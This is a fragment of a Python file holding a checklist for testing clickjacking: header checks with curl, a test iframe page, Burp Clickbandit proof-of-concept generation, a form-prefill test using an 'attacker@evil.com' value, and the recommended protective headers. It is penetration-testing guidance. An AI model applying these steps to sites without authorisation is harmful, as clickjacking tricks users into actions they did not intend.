                        'notes': '''Clickjacking testing workflow:

1. Check headers:
   curl -sI TARGET | grep -i "x-frame\\|frame-ancestors"

2. Test iframe loading:
   Create test.html:
   <iframe src="TARGET"></iframe>

   Open in browser:
   - Loads? Vulnerable
   - Blocked? Protected

3. Burp Clickbandit:
   - Visit target in Burp browser
   - Click Burp → Burp Clickbandit
   - Record clicks on target
   - Generate PoC HTML
   - Test PoC

4. Check for:
   - Missing X-Frame-Options
   - Missing CSP frame-ancestors
   - SAMEORIGIN (allows same-origin attack)
   - ALLOW-FROM (deprecated, check implementation)

5. Form prepopulation test:
   TARGET?email=attacker@evil.com
   Can forms be prefilled via GET params?

6. Protection verification:
   - X-Frame-Options: DENY (best)
   - CSP: frame-ancestors 'none'; (modern)
   - JavaScript frame-busting (bypassable)'''
                    }
                }
            ]
        })

        return tasks
